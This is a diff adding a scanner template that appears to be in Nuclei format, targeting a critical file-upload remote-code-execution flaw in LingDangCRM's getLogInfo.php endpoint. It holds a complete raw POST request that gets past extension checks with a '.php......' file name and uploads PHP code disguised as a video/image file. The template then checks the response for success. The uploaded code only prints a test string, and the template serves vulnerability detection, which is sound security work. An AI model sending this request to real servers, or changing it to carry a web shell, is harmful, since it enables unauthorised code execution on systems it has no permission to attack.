@@ -1,0 +1,51 @@
+id: LingDangCRM-getLogInfo-UpLoadFileToRCE
+
+info:
+  name: LingDangCRM-getLogInfo-UpLoadFileToRCE
+  author: iSee857
+  severity: critical
+  description: LingDangCRM-getLogInfo-UpLoadFileToRCE
+  reference:
+    - https://example.com/vuln-details
+  tags: file-upload,jsp,rce
+
+
+variables:
+    uploadfilename: "{{rand_base(5)}}"
+    sessionvalue: "uploadfile{{uploadfilename}}.php......"
+    md5_value: "{{md5(sessionvalue)}}"
+
+http:
+  - raw:
+      - |
+        POST /crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename={{uploadfilename}}.php......&callednumber=&sessionvalue={{md5_value}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTxlvAiDA82bSOF0h
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundaryTxlvAiDA82bSOF0h
+        Content-Disposition: form-data; name="uploaded_file"; filename="123321.avi"
+        Content-Type: image/jpeg
+
+        <?php
+        print "Hello, World!";
+        ?>
+        ------WebKitFormBoundaryTxlvAiDA82bSOF0h--
+
+
+    attack: batteringram
+    redirects: true
+    max-redirects: 3
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "filename"
+          - "filepath"
+          - "success"
+        condition: and
+        part: body
